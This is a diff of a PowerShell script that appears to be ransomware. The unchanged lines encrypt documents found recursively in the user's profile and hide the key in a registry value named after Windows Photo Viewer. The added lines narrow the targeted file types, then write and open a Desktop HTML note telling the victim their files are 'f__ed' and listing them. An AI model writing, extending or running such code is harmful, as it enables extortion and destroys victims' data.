@@ -44,11 +44,19 @@ Function encrypt($keyNums, $fileList)
 
 Function fileList()
 {
-    $files = cmd /c where /r "$env:USERPROFILE" *.txt *.xlsx *.docx *.doc *.ppt *.pptx *.accdb *.png *.jpg *.jpeg
+    $files = cmd /c where /r "$env:USERPROFILE" *.txt *.xlsx *.docx *.doc *.ppt *.pptx *.accdb
     $List = $files -split '\r'
     $List #return file list
 }
-
+Function generateFileList($fileList)
+{
+    $strOut = ""
+    foreach($i in 0..($fileList.Length - 1))
+    {
+        $strOut += "<tr><td>{0}. {1}</td></tr>" -f $i, $fileList[$i]
+    }
+    $strOut
+}
 #Main Program
 $regKey = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows Photo Viewer" -Name "array" -ErrorAction Ignore ).array
 if($regKey.Length -eq 913)
@@ -61,6 +69,9 @@ encrypt $keyNums $fileList
 $keyNums = $keyNums -join ","
 New-ItemProperty -Path "HKCU:\SOFTWARE\MICROSOFT\Windows Photo Viewer" -Name "array" -Value $keyNums -Force >$null
 
+$fileResult = generateFileList $fileList
+$web = "<html><style>table, td {{border: 1px solid black;}}</style><body><h1>Your files are f__ed.</h1><h2>Your f__ed files:</h2><table>{0}</table><body></html>" -f $fileResult
+Set-Content "$env:USERPROFILE\Desktop\READ_ME(ABOUT YOUR FILES).html" -value $web
+start "$env:USERPROFILE\Desktop\READ_ME(ABOUT YOUR FILES).html"
 #Main Program
-
 
